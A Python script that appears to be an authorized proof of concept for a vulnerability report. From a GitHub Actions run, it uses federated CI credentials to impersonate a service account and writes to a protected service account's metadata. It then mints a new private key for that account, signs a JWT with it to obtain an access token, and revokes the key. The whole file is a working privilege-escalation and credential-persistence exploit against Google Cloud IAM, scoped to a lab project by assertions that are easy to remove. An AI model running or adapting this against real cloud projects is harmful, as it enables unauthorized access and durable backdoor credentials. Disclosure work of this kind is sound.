"""Authorized synthetic key-persistence proof with strict create/use/revoke lifecycle."""
from __future__ import annotations

import base64
import json
import os
from pathlib import Path
import subprocess
import time
from urllib.error import HTTPError
from urllib.parse import quote, urlencode
from urllib.request import Request, urlopen


def request_json(method: str, url: str, body: dict | None = None, token: str | None = None, bearer: str | None = None):
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    if bearer:
        headers["Authorization"] = "Bearer " + bearer
    request = Request(url, method=method, data=json.dumps(body).encode() if body is not None else None, headers=headers)
    try:
        with urlopen(request, timeout=60) as response:
            raw = response.read()
            return response.status, json.loads(raw) if raw else {}
    except HTTPError as error:
        return error.code, {}
    except Exception as error:
        raise RuntimeError(f"Expected endpoint failed: {error.__class__.__name__}") from None


def expect_ok(result, stage: str) -> dict:
    status, body = result
    if status < 200 or status >= 300:
        raise RuntimeError(f"{stage} returned status {status}")
    return body


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def exchange_service_account_jwt(assertion: str) -> None:
    form = urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": assertion}).encode()
    request = Request("https://oauth2.googleapis.com/token", data=form, method="POST", headers={"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urlopen(request, timeout=60) as response:
            body = json.loads(response.read())
    except HTTPError as error:
        raise RuntimeError(f"Private-key authentication returned status {error.code}") from None
    if not isinstance(body.get("access_token"), str) or not body["access_token"]:
        raise RuntimeError("Private-key authentication returned no access token")


def get_ci_token(credential: dict) -> str:
    source = credential["credential_source"]
    oidc = expect_ok(request_json("GET", source["url"], bearer=source["headers"]["Authorization"].removeprefix("Bearer ")), "OIDC request")
    subject_token = oidc[source["format"]["subject_token_field_name"]]
    federation = expect_ok(request_json("POST", credential["token_url"], {
        "audience": credential["audience"],
        "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
        "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "subjectTokenType": credential["subject_token_type"],
        "subjectToken": subject_token,
    }), "WIF federation")
    return expect_ok(request_json("POST", credential["service_account_impersonation_url"], {
        "delegates": [],
        "scope": ["https://www.googleapis.com/auth/cloud-platform"],
        "lifetime": "600s",
    }, token=federation["access_token"]), "CI service-account impersonation")["accessToken"]


def main() -> None:
    run_id = os.environ["GITHUB_RUN_ID"]
    assert run_id.isdigit()
    credential = json.loads(Path(os.environ["GOOGLE_APPLICATION_CREDENTIALS"]).read_text())
    project = os.environ["LAB_GCP_PROJECT"]
    target = os.environ["LAB_TARGET_SERVICE_ACCOUNT"]
    assert project == "vrp-lab-20261125-f150d192"
    assert target == f"mirror-protected-c7cb6d5@{project}.iam.gserviceaccount.com"
    assert credential["token_url"].startswith("https://sts.googleapis.com/")
    assert credential["service_account_impersonation_url"].startswith("https://iamcredentials.googleapis.com/")
    target_url = "https://iam.googleapis.com/v1/projects/" + quote(project, safe="") + "/serviceAccounts/" + quote(target, safe="")
    denied_status, _ = request_json("GET", target_url)
    assert denied_status in {401, 403}, f"Expected denied unauthenticated read, got {denied_status}"
    subprocess.run(["openssl", "version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

    ci_token = get_ci_token(credential)
    expected_marker = "untrusted-pr-write-verified-" + run_id
    expect_ok(request_json("PATCH", target_url, {"serviceAccount": {"displayName": expected_marker}, "updateMask": "displayName"}, token=ci_token), "protected metadata write")
    assert expect_ok(request_json("GET", target_url, token=ci_token), "protected metadata readback").get("displayName") == expected_marker
    before_keys = expect_ok(request_json("GET", target_url + "/keys", token=ci_token), "pre-probe key listing").get("keys", [])
    before_user_keys = [entry for entry in before_keys if entry.get("keyOrigin") == "USER_PROVIDED"]
    before_google_keys = [entry["name"] for entry in before_keys if entry.get("keyOrigin") == "GOOGLE_PROVIDED"]
    assert len(before_user_keys) == 0, "This exact test requires zero pre-existing USER_PROVIDED keys"

    key_resource = None
    key_id = None
    private_key_path = None
    private_key_authenticated = False
    key_deleted = False
    try:
        key_resource = expect_ok(request_json("POST", target_url + "/keys", {
            "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
            "keyAlgorithm": "KEY_ALG_RSA_2048",
        }, token=ci_token), "synthetic service-account key creation")
        key_id = key_resource.get("privateKeyId") or key_resource["name"].rsplit("/", 1)[-1]
        key_json = json.loads(base64.b64decode(key_resource["privateKeyData"]))
        assert key_json["client_email"] == target
        assert key_json["private_key_id"] == key_id

        now = int(time.time())
        header = b64url(json.dumps({"alg": "RS256", "typ": "JWT", "kid": key_id}, separators=(",", ":")).encode())
        claims = b64url(json.dumps({
            "iss": target,
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "aud": "https://oauth2.googleapis.com/token",
            "iat": now,
            "exp": now + 300,
        }, separators=(",", ":")).encode())
        signing_input = f"{header}.{claims}".encode()
        private_key_path = Path(os.environ["RUNNER_TEMP"]) / "ephemeral-test-private-key.pem"
        private_key_path.write_bytes(key_json["private_key"].encode())
        private_key_path.chmod(0o600)
        signature = subprocess.run(
            ["openssl", "dgst", "-sha256", "-sign", str(private_key_path)],
            input=signing_input,
            capture_output=True,
            check=True,
        ).stdout
        assertion = f"{header}.{claims}.{b64url(signature)}"
        exchange_service_account_jwt(assertion)
        private_key_authenticated = True
    finally:
        if private_key_path and private_key_path.exists():
            private_key_path.unlink()
        if key_resource:
            key_delete_url = "https://iam.googleapis.com/v1/" + quote(key_resource["name"], safe="/")
            expect_ok(request_json("DELETE", key_delete_url, token=ci_token), "synthetic key revocation")
            key_deleted = True

    assert private_key_authenticated, "New private key did not authenticate"
    assert key_deleted, "New private key was not revoked"
    remaining_keys = expect_ok(request_json("GET", target_url + "/keys", token=ci_token), "post-revocation key listing").get("keys", [])
    remaining_user_keys = [entry for entry in remaining_keys if entry.get("keyOrigin") == "USER_PROVIDED"]
    remaining_google_keys = [entry["name"] for entry in remaining_keys if entry.get("keyOrigin") == "GOOGLE_PROVIDED"]
    assert len(remaining_user_keys) == 0, f"Expected zero remaining user keys, got {len(remaining_user_keys)}"
    assert remaining_google_keys == before_google_keys, "A Google-provided key changed during the authorized probe"
    result = {
        "run_id": run_id,
        "unauthenticated_target_read_denied": denied_status,
        "protected_metadata_write_confirmed": True,
        "wif_and_ci_identity_accepted": True,
        "one_new_key_created": True,
        "new_private_key_authenticated": private_key_authenticated,
        "same_new_key_revoked": key_deleted,
        "remaining_user_managed_keys": len(remaining_user_keys),
        "google_provided_keys_untouched": remaining_google_keys == before_google_keys,
        "synthetic_key_id": key_id,
        "private_material_or_tokens_logged_or_saved": False,
    }
    Path(os.environ["RUNNER_TEMP"], "credential-persistence-result.json").write_text(json.dumps(result, indent=2) + "\n")
    print("SYNTHETIC_PRIVATE_KEY_USED_AND_REVOKED")
    print("SYNTHETIC_ZERO_REMAINING_USER_KEYS")


if __name__ == "__main__":
    main()
